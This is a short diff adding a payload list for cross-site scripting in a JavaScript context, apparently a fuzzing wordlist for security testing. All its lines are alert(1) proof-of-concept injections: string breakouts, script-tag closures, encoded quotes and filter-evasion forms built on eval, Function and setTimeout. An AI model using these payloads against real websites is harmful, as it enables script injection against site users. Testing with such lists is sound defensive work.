@@ -1,0 +1,20 @@
+# JavaScript context — break out of JS strings/blocks
+');alert(1);//
+");alert(1);//
+`);alert(1);//
+'-alert(1)-'
+"-alert(1)-"
+\';alert(1);//
+</script><script>alert(1)</script>
+</script><img src=x onerror=alert(1)>
+\u0022;alert(1);//
+\x22;alert(1);//
+};alert(1);//
+alert(1)
+window['alert'](1)
+(alert)(1)
+[1].find(alert)
+window['\x61lert'](1)
+eval('ale'+'rt(1)')
+Function('alert(1)')()
+setTimeout('alert(1)',0)
